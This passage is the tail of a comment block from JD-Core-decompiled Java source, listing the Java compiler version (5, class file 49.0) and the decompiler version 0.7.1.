 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */